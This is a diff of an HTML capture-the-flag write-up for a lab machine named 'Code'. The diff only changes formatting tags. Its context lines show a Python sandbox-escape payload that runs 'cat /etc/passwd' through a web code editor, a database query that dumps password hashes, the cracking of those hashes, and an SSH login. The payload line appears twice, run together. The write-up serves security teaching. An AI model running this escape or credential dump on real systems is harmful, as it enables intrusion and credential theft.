@@ -84,7 +84,7 @@
     <a href="/writeups/" class="back-link">Back to all writeups</a>
     <div class="writeup-body">
       <h2 class="writeup-section-title">Machine Overview</h2>
-      <p>Code is a Medium difficulty Linux machine featuring a <strong>Python code editor</strong> web application. The editor allows arbitrary Python execution, which can be leveraged to read system files and dump database credentials. After cracking the password hashes, SSH access is obtained. Privilege escalation exploits a <code>sudo</code> misconfiguration with a custom backup script (<code>backy.sh</code>) that allows reading arbitrary files as root through crafted JSON task definitions.</p>
+      <p>Code is a Medium difficulty Linux machine featuring a <code>Python code editor</code> web application. The editor allows arbitrary Python execution, which can be leveraged to read system files and dump database credentials. After cracking the password hashes, SSH access is obtained. Privilege escalation exploits a <code>sudo</code> misconfiguration with a custom backup script (<code>backy.sh</code>) that allows reading arbitrary files as root through crafted JSON task definitions.</p>
       <h2 class="writeup-section-title">Initial Enumeration</h2>
       <h3 class="writeup-sub-title">Port Scanning</h3>
       <p>I start with a full TCP port scan to identify all open ports.</p>
@@ -172,7 +172,7 @@ Nmap done: 1 IP address (1 host up) scanned in 9.08 seconds
            Raw packets sent: 6 (240B) | Rcvd: 3 (116B)</code></pre></div>
       <h2 class="writeup-section-title">Foothold: Python Code Editor RCE</h2>
       <h3 class="writeup-sub-title">Discovering the Code Editor</h3>
-      <p>The web application on port 5000 hosts a <strong>Python Code Editor</strong> — a browser-based tool that executes Python code server-side and returns the output. This is essentially a free Remote Code Execution (RCE) endpoint if not properly sandboxed.</p>
+      <p>The web application on port 5000 hosts a <code>Python Code Editor</code> — a browser-based tool that executes Python code server-side and returns the output. This is essentially a free Remote Code Execution (RCE) endpoint if not properly sandboxed.</p>
       <h3 class="writeup-sub-title">Reading System Files</h3>
       <p>I test whether I can break out of the editor's sandbox by using Python's <code>__subclasses__</code> introspection to access the <code>subprocess</code> module and execute system commands. The payload reads <code>/etc/passwd</code> to enumerate system users.</p>
       <div class="code-block"><pre><code>print(object.__subclasses__()[317](&quot;cat /etc/passwd&quot;, shell=True, stdout=-1).communicate())print(object.__subclasses__()[317](&quot;cat /etc/passwd&quot;, shell=True, stdout=-1).communicate())
@@ -183,7 +183,7 @@ Nmap done: 1 IP address (1 host up) scanned in 9.08 seconds
       <div class="code-block"><pre><code>print([(user.id, user.username, user.password) for user in User.query.all()])
 
 [(1, &#x27;development&#x27;, &#x27;759b74ce43947f5f4c91aeddc3e5bad3&#x27;), (2, &#x27;martin&#x27;, &#x27;3de6f30c4a09c27fc71932bfc68474be&#x27;)]</code></pre></div>
-      <p>Two hashes were found. I paste them into <strong>CrackStation</strong> (an online hash-cracking service) to save time, and both hashes are successfully cracked.</p>
+      <p>Two hashes were found. I paste them into <code>CrackStation</code> (an online hash-cracking service) to save time, and both hashes are successfully cracked.</p>
       <h3 class="writeup-sub-title">SSH Access as martin</h3>
       <p>I test the discovered credentials against the SSH server and successfully log in as the user <code>martin</code>.</p>
       <div class="code-block"><pre><code>ssh martin@10.129.37.223                                                        
